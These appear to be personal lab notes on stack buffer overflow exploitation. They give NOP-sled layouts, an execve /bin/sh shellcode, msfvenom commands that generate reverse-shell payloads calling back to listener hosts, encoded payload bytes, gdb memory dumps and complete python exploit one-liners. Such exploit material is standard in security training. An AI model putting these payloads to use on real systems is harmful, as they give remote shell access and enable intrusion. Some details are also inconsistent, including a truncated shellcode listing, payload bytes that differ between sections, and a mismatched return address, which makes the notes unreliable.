
#### Using shell code

We want to put code in memory and then redirect execution to this memory.

We use a number of nop instructions to make the address of the exploit easier to get to. If we have 30 nops all addresses within these will lead execution to the shell code.

Structure of the input:
`python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"`

Example:
`python -c "print('\x90'*30+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*60+'\xef\xbe\xad\xde')" | ./program`


#### Example shell code

Shell code that opens a basic shell (source THM) (useful if SUID is set)
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```
28 bytes

The shell code disassembled using r2, commands aaa and then pdf:
![[../Images/Pasted image 20240809204245.png]]
<font size=2>A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.<br>
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.<br>
RCX is then pushed onto the stack.<br>
Other requirements for the syscall (execve) to exectue the path are prepared and then the syscall is made.</font>

#### Generate shell code

`msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>`

`msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

`msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

`msfvenom --payload 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 --format 'python' --bad-chars '\x00\x0a'`

```sh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb"
"\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b"
"\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2"
"\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8"
"\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3"
"\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee";
```

Shellcode: 
```
\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee
```

Number of bytes: 95

<font color="yellow">Add 16 or more nops</font> - When the payload in decoded/unpacked it will take more space.

#### Find the execution start address

the position returned by pattern_offset.rb = 2060
a random number of nops = 256
the number of bytes in the payload = 95
32-bit executable gives a 32-bit address = 4 bytes

```sh
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x66" * 4')
```

Afterwards we confirm that it's been entered  into memory in the format we supplied with python.

```sh
(gdb) x/2000xb $esp+2200

0xffffd6b1:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6b9:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6c1:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd6c9:     0x55    0x90    0x90    0x90    0x90    0x90    0x90    0x90  Nops
0xffffd6d1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6d9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6e1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6e9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f1:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f9:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd701:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd709:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd711:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd719:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd721:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd729:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd731:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd739:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd741:     0x90    0x90    0x90    0x90    0x90    0xbd    0xca    0x92  Shell code
0xffffd749:     0xd0    0xf7    0xdb    0xcd    0xd9    0x74    0x24    0xf4
0xffffd751:     0x5b    0x31    0xc9    0xb1    0x12    0x83    0xc3    0x04
0xffffd759:     0x31    0x6b    0x0e    0x03    0xa1    0x9c    0x32    0x02
0xffffd761:     0x04    0x7a    0x45    0x0e    0x35    0x3f    0xf9    0xbb
0xffffd769:     0xbb    0x36    0x1c    0x8b    0xdd    0x85    0x5f    0x7f
0xffffd771:     0x78    0xa6    0x5f    0x4d    0xfa    0x8f    0xe6    0xb4
0xffffd779:     0x92    0x70    0x19    0x47    0x63    0xe7    0x1b    0x47
0xffffd781:     0x19    0x9e    0x92    0xa6    0x6d    0x06    0xf5    0x79
0xffffd789:     0xde    0x74    0xf6    0xf0    0x01    0xb7    0x79    0x50
0xffffd791:     0xa9    0x26    0x55    0x26    0x41    0xdf    0x86    0xe7
0xffffd799:     0xf3    0x76    0x50    0x14    0xa1    0xdb    0xeb    0x3a
0xffffd7a1:     0xf5    0xd7    0x26    0x3c    0x66    0x66    0x66    0x66  66666666 repersents the spot where the instruction pointer will be restored from
```

We select an address in the middle of out nops, `0xffffd731`, as our start address.

Remember the endianness and reverse the address when adding it to the python:
0xffffcc90
```sh
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x31\xd7\xff\xff"')
```

Now our shellcode will hopefully be run!
